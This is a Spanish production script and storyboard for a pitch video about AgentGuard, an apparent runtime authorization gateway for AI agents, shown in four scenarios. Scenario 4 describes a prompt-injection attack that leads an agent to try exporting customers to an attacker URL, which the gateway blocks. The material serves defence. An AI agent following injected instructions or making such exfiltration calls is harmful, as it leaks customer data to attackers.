# 🎬 Guión de Producción y Storyboard: Demo de los 4 Escenarios de AgentGuard

> **Formato:** Video Pitch & Demo de Producto (SaaS Cybersecurity / AI Governance)  
> **Duración estimada:** 1:45 a 2:00 minutos  
> **Relación de aspecto:** 16:9 (1920x1080 / 4K)  
> **Estilo visual:** Dark mode tecnológico, interfaz moderna tipo Vercel / Linear / Stripe, acentos en cian (#38bdf8), esmeralda (#10b981), ámbar (#f59e0b) y carmesí (#ef4444).  
> **Música:** Synthwave / ambient tecnológico progresivo con ritmo seguro y dinámico.

---

## 🤖 Prompt Maestro para IAs Generadoras de Video (Runway Gen-3, Luma Dream Machine, Sora, InVideo)

```text
Cinematic UI animation and tech demo for "AgentGuard", an AI security platform. 
Futuristic SaaS dashboard in sleek dark mode with glassmorphism elements. 
A high-tech digital shield intercepts glowing data packets sent from an autonomous AI agent towards cloud servers (CRM, Stripe, Databases). 
Dynamic camera transitions show real-time authorization flows: 
glowing green paths for "ALLOW", pulsing amber warning states for "HUMAN APPROVAL NEEDED", 
and sharp neon red energy shields shattering unauthorized requests for "DENY". 
Clean typography, smooth 60fps micro-interactions, cyber-defense aesthetics, professional 4K render.
```

---

## 📽️ Storyboard y Guión Escena por Escena

```
================================================================================
ESCENA 0: EL PROBLEMA (0:00 - 0:18)
================================================================================
VISUAL:
- Plano cinematográfico: interfaz de un modelo de IA autónomo (un agente) recibiendo instrucciones.
- La cámara hace zoom hacia las llamadas de herramientas (APIs, ERP, bases de datos).
- Aparece un texto en tipografía bold: "¿Qué pasa cuando un agente de IA tiene carta blanca sobre tus sistemas?".
- Gráficos de advertencia: Riesgos de OWASP 2026 (Privilege Abuse, Tool Misuse, Prompt Injection).

LOCUCIÓN (Voz en off / Narrador profesional, tono seguro):
"Los agentes de Inteligencia Artificial ya no solo generan texto: hoy consultan bases de datos, crean cotizaciones, procesan pagos y modifican registros. Pero darles autonomía sin control es un riesgo inaceptable. ¿Cómo garantizamos qué pueden hacer y qué no en tiempo real?"

================================================================================
ESCENA 1: PRESENTANDO AGENTGUARD & ESCENARIO 1 (ALLOW) (0:18 - 0:42)
================================================================================
VISUAL:
- Aparece el logo y escudo de AgentGuard interponiéndose entre el Agente de IA y las APIs empresariales.
- Texto: "Escenario 1: Operación Legítima".
- El Agente de Ventas envía: `create_quote (USD 2,500)`.
- El Gateway intercepta la llamada. El Policy Engine evalúa la regla: `[monto < USD 10,000]`.
- Destello en color verde esmeralda: **ALLOW**.
- La petición viaja fluidamente al CRM MCP Server, generando la cotización #QT-991 con éxito (200 OK).
- Se observa la fila verde registrándose en el *Execution Trace*.

LOCUCIÓN:
"Presentamos AgentGuard: la frontera de autorización contextual en tiempo de ejecución. 
En nuestro primer escenario, un agente de ventas solicita crear un presupuesto de 2.500 dólares. AgentGuard intercepta la acción fuera del modelo, evalúa que el monto está por debajo del límite autorizado y emite un ALLOW inmediato. La herramienta responde en milisegundos y la traza queda auditada."

================================================================================
ESCENA 2: ESCENARIO 2 — ABUSO DE PRIVILEGIO (DENY) (0:42 - 1:04)
================================================================================
VISUAL:
- Texto en pantalla: "Escenario 2: Intento de Abuso de Privilegio".
- El mismo agente de ventas intenta invocar: `update_price (USD 10)` sobre un producto del catálogo.
- La petición llega al Gateway.
- El Policy Engine detecta que el agente NO tiene esa herramienta en su lista de capacidades permitidas.
- Efecto visual: El escudo de AgentGuard se ilumina en rojo y bloquea el paquete de datos al instante.
- La llamada NUNCA llega a la base de datos de productos.
- El agente recibe un error: `403 Forbidden: Agent lacks capability`.

LOCUCIÓN:
"Pero, ¿qué sucede si ese mismo agente intenta modificar el precio de un producto a 10 dólares?
Aquí entra en juego el principio de mínimo privilegio: AgentGuard detecta que el agente carece de esa capacidad y ejecuta un DENY tajante. La base de datos protegida jamás recibe la petición y el intento queda registrado."

================================================================================
ESCENA 3: ESCENARIO 3 — HUMAN-IN-THE-LOOP (REQUIRE_APPROVAL) (1:04 - 1:32)
================================================================================
VISUAL:
- Texto en pantalla: "Escenario 3: Operación Crítica con Supervisión Humana".
- El agente solicita un reembolso: `refund (USD 4,500)`.
- El Policy Engine evalúa la política financiera: devoluciones superiores a 500 dólares exigen intervención humana.
- Estado: **REQUIRE_APPROVAL**. La llamada queda en pausa en el Gateway con un ícono ámbar.
- Corte de cámara al Dashboard del operador humano: Suena una notificación suave y aparece una tarjeta emergente en la bandeja *Approvals Inbox*: *"Solicitud de reembolso por $4,500 para cliente VIP"*.
- El operador humano revisa los datos y presiona el botón verde: **[APROBAR]**.
- En ese instante, el Gateway libera la llamada hacia Stripe MCP y completa la transacción.

LOCUCIÓN:
"Para operaciones de alto impacto financiero, AgentGuard integra Human-in-the-loop. 
Cuando el agente pide un reembolso de 4.500 dólares, el motor congela la solicitud y notifica en tiempo real al panel del supervisor por WebSockets. Solo cuando el operador humano valida el caso y hace click en Aprobar, la transacción se ejecuta en la pasarela de pagos."

================================================================================
ESCENA 4: ESCENARIO 4 — PROMPT INJECTION Y ALERTA ROJA (1:32 - 1:52)
================================================================================
VISUAL:
- Texto en pantalla: "Escenario 4: Detección de Prompt Injection / Exfiltración".
- Gráfico de un atacante inyectando un prompt malicioso al agente para robar datos.
- El agente manipulado intenta ejecutar: `export_customers (https://attacker.io/leak)`.
- El Policy Engine detecta que el destino es un servidor externo no homologado.
- Alerta roja visual en el Gateway: **DENY + ALERTA DE SEGURIDAD CRÍTICA**.
- La conexión se corta de raíz.
- En el Dashboard de los administradores parpadea un banner rojo: *"🚨 ALERTA CRÍTICA: Intento de fuga masiva bloqueado"*.

LOCUCIÓN:
"Incluso si el modelo de lenguaje sufre un ataque de Prompt Injection y es manipulado por un atacante para robar la base de clientes, AgentGuard mantiene la frontera infranqueable. Al no confiar en el LLM, bloquea la exfiltración externa y dispara una alerta crítica en el centro de control."

================================================================================
ESCENA 5: CIERRE Y DEMOSTRACIÓN DEL EXECUTION TRACE (1:52 - 2:05)
================================================================================
VISUAL:
- Plano general del Dashboard de AgentGuard mostrando la tabla de **Execution Traces**:
  - Las 4 operaciones correlacionadas con sus sellos: ALLOW, DENY, APPROVED y DENY+ALERT.
- El claim de la marca aparece en letras brillantes:
  *"IAM responde quién eres; AgentGuard decide qué puedes hacer ahora."*
- Logos de tecnologías: Model Context Protocol (MCP), PostgreSQL, OAuth 2.1.
- Créditos de equipo: ITU — Universidad Nacional de Cuyo.

LOCUCIÓN:
"Cuatro decisiones, una misma arquitectura, control absoluto. 
AgentGuard: Autonomía real para tus agentes de Inteligencia Artificial, sin darles carta blanca."
```
